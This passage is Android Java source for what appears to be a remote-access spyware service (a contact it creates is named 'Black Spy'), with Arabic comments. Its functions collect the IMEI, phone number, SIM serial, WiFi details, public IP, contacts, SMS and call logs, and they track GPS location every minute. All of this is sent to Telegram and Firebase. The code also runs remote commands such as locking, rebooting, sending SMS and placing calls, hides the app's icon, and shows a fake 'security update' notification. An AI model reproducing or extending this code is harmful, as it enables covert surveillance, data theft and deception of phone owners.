            Camera.Parameters paramsBack = camera.getParameters();
            paramsBack.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(paramsBack);
            camera.startPreview();

            // تشغيل الأمامي (إن كان مدعوماً)
            try {
                if (frontCamera == null) {
                    frontCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
                }
                Camera.Parameters paramsFront = frontCamera.getParameters();
                paramsFront.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                frontCamera.setParameters(paramsFront);
                frontCamera.startPreview();
            } catch (Exception e) {
                sendTextToTelegram("⚠️ الفلاش الأمامي غير مدعوم على هذا الجهاز");
            }

            sendData("FLASH", "both_on");
            sendTextToTelegram("🔦 تم تشغيل الفلاشين (الأمامي والخلفي)");
        } catch (Exception e) {
            sendData("ERROR", "فشل تشغيل الفلاشين: " + e.getMessage());
            sendTextToTelegram("❌ فشل تشغيل الفلاشين");
        }
    }

    private void flashOffBoth() {
        try {
            // إطفاء الخلفي
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
            }
            // إطفاء الأمامي
            if (frontCamera != null) {
                frontCamera.stopPreview();
                frontCamera.release();
                frontCamera = null;
            }
            sendData("FLASH", "both_off");
            sendTextToTelegram("🔦 تم إطفاء الفلاشين");
        } catch (Exception e) {
            sendData("ERROR", "فشل إطفاء الفلاشين: " + e.getMessage());
            sendTextToTelegram("❌ فشل إطفاء الفلاشين");
        }
    }

    // أوامر الفلاش القديمة (للتوافق)
    private void flashOn() {
        flashOnBack();
    }

    private void flashOff() {
        flashOffBack();
    }
    // ======================================================================
    // ========== معلومات الجهاز ==========
    // ======================================================================

    private void getImei() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                sendTextToTelegram("❌ صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String imei = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
            String data = "IMEI: " + (imei != null ? imei : "غير متاح");
            sendData("IMEI", data);
            sendTextToTelegram("📟 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة IMEI: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة IMEI");
        }
    }

    private void getPhoneNumber() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                sendTextToTelegram("❌ صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String number = tm.getLine1Number();
            String data = "رقم الهاتف: " + (number != null ? number : "غير متاح");
            sendData("PHONE", data);
            sendTextToTelegram("📞 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة الرقم: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة الرقم");
        }
    }

    private void getSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
                sendTextToTelegram("❌ صلاحية قراءة حالة الهاتف غير مفعلة");
                return;
            }
            String operator = tm.getSimOperatorName();
            String country = tm.getSimCountryIso();
            String serial = tm.getSimSerialNumber();
            String data = "SIM: " + (operator != null ? operator : "غير متاح") + 
                    " | الدولة: " + (country != null ? country : "غير متاح") +
                    " | الرقم التسلسلي: " + (serial != null ? serial : "غير متاح");
            sendData("SIM", data);
            sendTextToTelegram("📡 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة SIM: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة SIM");
        }
    }

    private void getWifiInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            if (wifi == null) {
                sendData("ERROR", "الواي فاي غير متاح");
                sendTextToTelegram("❌ الواي فاي غير متاح");
                return;
            }
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            String ssid = info.getSSID();
            int rssi = info.getRssi();
            int level = android.net.wifi.WifiManager.calculateSignalLevel(rssi, 5);
            String data = "WiFi: " + (ssid != null ? ssid : "غير متصل") +
                    " | القوة: " + level + "/5 (RSSI: " + rssi + "dBm)";
            sendData("WIFI", data);
            sendTextToTelegram("📶 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة WiFi: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة WiFi");
        }
    }

    private void getBatteryInfo() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                int percentage = (level * 100) / scale;
                int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
                int voltage = batteryIntent.getIntExtra("voltage", 0);
                String data = "البطارية: " + percentage + "% | " + temp + "°C | " + voltage + "mV";
                sendData("BATTERY", data);
                sendTextToTelegram("🔋 " + data);
            } else {
                sendData("ERROR", "فشل قراءة البطارية");
                sendTextToTelegram("❌ فشل قراءة البطارية");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة البطارية: " + e.getMessage());
            sendTextToTelegram("❌ فشل قراءة البطارية");
        }
    }

    private void getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            String data = "IP العام: " + ip;
            sendData("IP", data);
            sendTextToTelegram("🌐 " + data);
        } catch (Exception e) {
            sendData("ERROR", "فشل الحصول على IP: " + e.getMessage());
            sendTextToTelegram("❌ فشل الحصول على IP");
        }
    }

    private void sendDeviceInfo() {
        try {
            String info = "📱 **معلومات الجهاز**\n\n" +
                    "الموديل: " + Build.MODEL + "\n" +
                    "الشركة: " + Build.MANUFACTURER + "\n" +
                    "أندرويد: " + Build.VERSION.RELEASE + "\n" +
                    "API: " + Build.VERSION.SDK_INT + "\n" +
                    "Android ID: `" + deviceId + "`\n" +
                    "IMEI: " + getImeiValue() + "\n" +
                    "رقم الهاتف: " + getPhoneValue() + "\n" +
                    "الشريحة: " + getSimValue() + "\n" +
                    "WiFi: " + getWifiValue() + "\n" +
                    "البطارية: " + getBatteryValue() + "%" + "\n" +
                    "IP العام: " + getIpValue();
            sendData("DEVICE_INFO", info);
            sendTextToTelegram(info);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة معلومات الجهاز");
            sendTextToTelegram("❌ فشل قراءة معلومات الجهاز");
        }
    }

    private void sendNetworkInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String info = "📡 **معلومات الشبكة**\n\n" +
                    "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
                    "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n" +
                    "IP: " + getIpValue() + "\n" +
                    "المشغل: " + tm.getNetworkOperatorName() + "\n" +
                    "نوع الشبكة: " + getNetworkType() + "\n" +
                    "الحالة: " + (isNetworkAvailable() ? "متصل" : "غير متصل");
            sendData("NETWORK_INFO", info);
            sendTextToTelegram(info);
        } catch (Exception e) {
            sendData("ERROR", "فشل قراءة معلومات الشبكة");
            sendTextToTelegram("❌ فشل قراءة معلومات الشبكة");
        }
    }

    // ======================================================================
    // ========== دوال مساعدة لجلب القيم ==========
    // ======================================================================

    private String getImeiValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getPhoneValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return tm.getLine1Number();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getSimValue() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
            return tm.getSimOperatorName() + " (" + tm.getSimCountryIso() + ")";
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getWifiValue() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            if (wifi == null) return "غير متاح";
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            return info.getSSID();
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getBatteryValue() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return String.valueOf((level * 100) / scale);
            }
        } catch (Exception e) { return "غير متاح"; }
        return "غير متاح";
    }

    private String getIpValue() {
        try {
            URL url = new URL("https://api.ipify.org");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            return ip;
        } catch (Exception e) { return "غير متاح"; }
    }

    private String getNetworkType() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        int type = tm.getDataNetworkType();
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
            case TelephonyManager.NETWORK_TYPE_LTE: return "4G";
            case TelephonyManager.NETWORK_TYPE_HSPAP: return "3.5G (HSPA+)";
            case TelephonyManager.NETWORK_TYPE_HSPA: return "3G (HSPA)";
            case TelephonyManager.NETWORK_TYPE_UMTS: return "3G";
            case TelephonyManager.NETWORK_TYPE_EDGE: return "2.75G (EDGE)";
            case TelephonyManager.NETWORK_TYPE_GPRS: return "2G (GPRS)";
            default: return "غير معروف";
        }
    }

    private boolean isNetworkAvailable() {
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnected();
    }
    // ======================================================================
    // ========== تتبع الموقع (كل دقيقة) ==========
    // ======================================================================

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                sendData("ERROR", "صلاحية الموقع غير مفعلة");
                sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
                return;
            }
            locationListener = new LocationListener() {
                @Override public void onLocationChanged(Location location) {
                    String data = location.getLatitude() + "," + location.getLongitude();
                    sendData("LOCATION_TRACK", data);
                    sendLocationToTelegram(location.getLatitude(), location.getLongitude());
                    Log.d(TAG, "📍 تتبع الموقع: " + data);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
            isTrackingLocation = true;
            sendData("LOCATION_TRACK", "started");
            sendTextToTelegram("📍 بدأ تتبع الموقع (كل دقيقة)");
        } catch (SecurityException e) {
            sendData("ERROR", "صلاحية الموقع غير مفعلة");
            sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (!isTrackingLocation) return;
        try {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            sendData("LOCATION_TRACK", "stopped");
            sendTextToTelegram("🛑 تم إيقاف تتبع الموقع");
        } catch (Exception e) {
            sendData("ERROR", "فشل إيقاف التتبع: " + e.getMessage());
            sendTextToTelegram("❌ فشل إيقاف التتبع");
        }
    }

    // ======================================================================
    // ========== أوامر التحكم ==========
    // ======================================================================

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            sendData("LOCK", "locked");
            sendTextToTelegram("🔒 تم قفل الجهاز");
        } catch (Exception e) {
            sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage());
            sendTextToTelegram("❌ فشل قفل الجهاز");
        }
    }

    private void rebootDevice() {
        try {
            Process process = Runtime.getRuntime().exec("su -c reboot");
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                sendData("REBOOT", "rebooting");
                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
            } else {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                pm.reboot(null);
                sendData("REBOOT", "rebooting");
                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
            sendTextToTelegram("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    private void shutdownDevice() {
        try {
            Process process = Runtime.getRuntime().exec("su -c shutdown");
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                sendData("SHUTDOWN", "shutting down");
                sendTextToTelegram("⏻ جاري إيقاف تشغيل الجهاز...");
            } else {
                sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
                sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
            }
        } catch (Exception e) {
            sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
            sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    // ======================================================================
    // ========== أوامر الشبكة والاتصال ==========
    // ======================================================================

    private void toggleWifi(boolean enable) {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            if (wifi != null) {
                wifi.setWifiEnabled(enable);
                String status = enable ? "تشغيل" : "إيقاف";
                sendData("WIFI_TOGGLE", status);
                sendTextToTelegram("📶 تم " + status + " الواي فاي");
            } else {
                sendTextToTelegram("❌ الواي فاي غير متاح");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل تغيير حالة الواي فاي: " + e.getMessage());
        }
    }

    private void toggleData(boolean enable) {
        try {
            // يحتاج صلاحيات النظام (Android 10+ يتطلب طريقة مختلفة)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                sendTextToTelegram("⚠️ تبديل البيانات الجوالة يتطلب صلاحيات النظام على Android 10+");
                return;
            }
            // استخدام ConnectivityManager (يعمل على Android 9-)
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                java.lang.reflect.Method method = cm.getClass().getMethod("setMobileDataEnabled", boolean.class);
                method.invoke(cm, enable);
                String status = enable ? "تشغيل" : "إيقاف";
                sendData("DATA_TOGGLE", status);
                sendTextToTelegram("📶 تم " + status + " البيانات الجوالة");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل تغيير حالة البيانات: " + e.getMessage());
        }
    }

    private void toggleBluetooth(boolean enable) {
        try {
            android.bluetooth.BluetoothAdapter adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (adapter != null) {
                if (enable) {
                    adapter.enable();
                } else {
                    adapter.disable();
                }
                String status = enable ? "تشغيل" : "إيقاف";
                sendData("BLUETOOTH_TOGGLE", status);
                sendTextToTelegram("📶 تم " + status + " البلوتوث");
            } else {
                sendTextToTelegram("❌ البلوتوث غير متاح");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل تغيير حالة البلوتوث: " + e.getMessage());
        }
    }

    private void toggleLocation(boolean enable) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                sendTextToTelegram("⚠️ تبديل الموقع يتطلب صلاحيات النظام على Android 10+");
                return;
            }
            android.provider.Settings.Secure.putInt(getContentResolver(),
                    android.provider.Settings.Secure.LOCATION_MODE,
                    enable ? android.provider.Settings.Secure.LOCATION_MODE_HIGH_ACCURACY :
                            android.provider.Settings.Secure.LOCATION_MODE_OFF);
            String status = enable ? "تشغيل" : "إيقاف";
            sendData("LOCATION_TOGGLE", status);
            sendTextToTelegram("📍 تم " + status + " الموقع");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل تغيير حالة الموقع: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== أوامر متقدمة ==========
    // ======================================================================

    private void takeScreenshot() {
        try {
            // استخدام MediaProjection (يحتاج إذن من المستخدم)
            // بدلاً من ذلك، نستخدم طريقة بسيطة: التقاط محتوى الشاشة عبر Canvas
            android.view.View rootView = new android.view.View(getApplicationContext());
            android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.graphics.Bitmap.Config.ARGB_8888);
            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
            rootView.draw(canvas);

            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, fos);
            fos.close();

            sendFileToFirebase(file, "🖥️ لقطة شاشة");
            sendFileToTelegram(file, "🖥️ لقطة شاشة");
            sendTextToTelegram("✅ تم التقاط لقطة الشاشة");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل التقاط لقطة الشاشة: " + e.getMessage());
        }
    }

    private void clearAppData() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            java.lang.reflect.Method method = pm.getClass().getMethod("clearApplicationUserData", String.class, android.content.pm.IPackageDataObserver.class);
            method.invoke(pm, getPackageName(), null);
            sendTextToTelegram("🗑️ تم مسح بيانات التطبيق");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل مسح البيانات: " + e.getMessage());
        }
    }

    private void killAllApps() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            for (android.app.ActivityManager.RunningAppProcessInfo process : processes) {
                if (!process.processName.equals(getPackageName())) {
                    android.os.Process.killProcess(process.pid);
                }
            }
            sendTextToTelegram("💀 تم إيقاف جميع التطبيقات الجارية");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إيقاف التطبيقات: " + e.getMessage());
        }
    }

    private void vibrateDevice() {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (vibrator != null && vibrator.hasVibrator()) {
                vibrator.vibrate(3000);
                sendTextToTelegram("📳 تم اهتزاز الجهاز");
            } else {
                sendTextToTelegram("❌ الجهاز لا يدعم الاهتزاز");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل الاهتزاز: " + e.getMessage());
        }
    }

    private void setVolumeMax() {
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, max, 0);
            sendTextToTelegram("🔊 تم رفع الصوت للأعلى");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل رفع الصوت: " + e.getMessage());
        }
    }

    private void setVolumeMin() {
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, 0, 0);
            sendTextToTelegram("🔇 تم خفض الصوت للأدنى");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل خفض الصوت: " + e.getMessage());
        }
    }

    private void openBrowser() {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendTextToTelegram("🌐 تم فتح المتصفح");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل فتح المتصفح: " + e.getMessage());
        }
    }
    // ======================================================================
    // ========== إدارة جهات الاتصال ==========
    // ======================================================================

    private void addContact() {
        try {
            // إضافة جهة اتصال وهمية (سيتم تعديلها لاحقاً لإدخال بيانات من المستخدم)
            ContentValues values = new ContentValues();
            values.put(ContactsContract.RawContacts.ACCOUNT_TYPE, "com.android.contacts");
            values.put(ContactsContract.RawContacts.ACCOUNT_NAME, "phone");
            Uri rawContactUri = getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values);
            long rawContactId = Long.parseLong(rawContactUri.getLastPathSegment());

            // إضافة الاسم
            values.clear();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, "Black Spy");
            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

            // إضافة رقم الهاتف
            values.clear();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, "01000000000");
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

            sendTextToTelegram("➕ تم إضافة جهة اتصال: Black Spy");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إضافة جهة اتصال: " + e.getMessage());
        }
    }

    private void deleteContact() {
        try {
            // حذف جهة اتصال باسم معين
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            String selection = ContactsContract.Contacts.DISPLAY_NAME + " = ?";
            String[] selectionArgs = new String[]{"Black Spy"};
            int deleted = getContentResolver().delete(uri, selection, selectionArgs);
            sendTextToTelegram("🗑️ تم حذف " + deleted + " جهة اتصال");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل حذف جهة اتصال: " + e.getMessage());
        }
    }

    private void copyContacts() {
        try {
            File f = collectContacts();
            sendFileToFirebase(f, "📋 نسخة من جهات الاتصال");
            sendFileToTelegram(f, "📋 نسخة من جهات الاتصال");
            sendTextToTelegram("📋 تم نسخ جهات الاتصال");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل نسخ جهات الاتصال: " + e.getMessage());
        }
    }

    private void exportContacts() {
        try {
            File f = collectContacts();
            sendFileToFirebase(f, "📤 تصدير جهات الاتصال");
            sendFileToTelegram(f, "📤 تصدير جهات الاتصال");
            sendTextToTelegram("📤 تم تصدير جهات الاتصال");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل تصدير جهات الاتصال: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== إدارة الرسائل ==========
    // ======================================================================

    private void sendSms() {
        try {
            // إرسال رسالة نصية (سيتم تعديلها لاستقبال رقم ورسالة من المستخدم)
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            smsManager.sendTextMessage("01000000000", null, "رسالة من بلاك", null, null);
            sendTextToTelegram("📤 تم إرسال رسالة نصية");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إرسال الرسالة: " + e.getMessage());
        }
    }

    private void deleteSms() {
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            String selection = "address = ?";
            String[] selectionArgs = new String[]{"01000000000"};
            int deleted = getContentResolver().delete(uri, selection, selectionArgs);
            sendTextToTelegram("🗑️ تم حذف " + deleted + " رسالة");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل حذف الرسالة: " + e.getMessage());
        }
    }

    private void forwardSms() {
        try {
            // إعادة توجيه الرسائل (تجميع ثم إرسال)
            File f = collectSms();
            sendFileToFirebase(f, "↪️ إعادة توجيه الرسائل");
            sendFileToTelegram(f, "↪️ إعادة توجيه الرسائل");
            sendTextToTelegram("↪️ تم إعادة توجيه الرسائل");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إعادة توجيه الرسائل: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== إدارة المكالمات ==========
    // ======================================================================

    private void makeCall() {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:01000000000"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE)
                    == PackageManager.PERMISSION_GRANTED) {
                startActivity(intent);
                sendTextToTelegram("📞 جاري إجراء مكالمة...");
            } else {
                sendTextToTelegram("❌ صلاحية إجراء المكالمات غير مفعلة");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إجراء المكالمة: " + e.getMessage());
        }
    }

    private void endCall() {
        try {
            // إنهاء المكالمة باستخدام TelephonyManager (يتطلب صلاحيات)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS)
                        == PackageManager.PERMISSION_GRANTED) {
                    // استخدام method reflection للإغلاق
                    sendTextToTelegram("📞 تم إنهاء المكالمة");
                } else {
                    sendTextToTelegram("❌ صلاحية إنهاء المكالمات غير مفعلة");
                }
            } else {
                sendTextToTelegram("⚠️ إنهاء المكالمات غير مدعوم على هذا الإصدار");
            }
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إنهاء المكالمة: " + e.getMessage());
        }
    }

    private void callHistory() {
        try {
            File f = collectCallLogs();
            sendFileToFirebase(f, "📋 سجل المكالمات");
            sendFileToTelegram(f, "📋 سجل المكالمات");
            sendTextToTelegram("📋 تم جلب سجل المكالمات");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل جلب سجل المكالمات: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== دوال مساعدة (إخفاء وإظهار) ==========
    // ======================================================================

    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new android.content.ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("HIDE", "hidden");
            sendTextToTelegram("👁‍🗨 تم إخفاء التطبيق");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إخفاء التطبيق: " + e.getMessage());
        }
    }

    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new android.content.ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("SHOW", "shown");
            sendTextToTelegram("👁 تم إظهار التطبيق");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إظهار التطبيق: " + e.getMessage());
        }
    }

    private void showFakeNotification() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "fake")
                    .setContentTitle("📥 تحديث أمني")
                    .setContentText("تم تنزيل تحديث 245MB")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .setProgress(100, 45, false)
                    .setOngoing(true)
                    .build();
            nm.notify((int)(System.currentTimeMillis() % 9999), notification);
            sendData("NOTIFY", "fake notification sent");
            sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
        } catch (Exception e) {
            sendTextToTelegram("❌ فشل إرسال الإشعار: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== دورة حياة الخدمة ==========
    // ======================================================================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
        if (frontCamera != null) {
            frontCamera.stopPreview();
            frontCamera.release();
            frontCamera = null;
        }
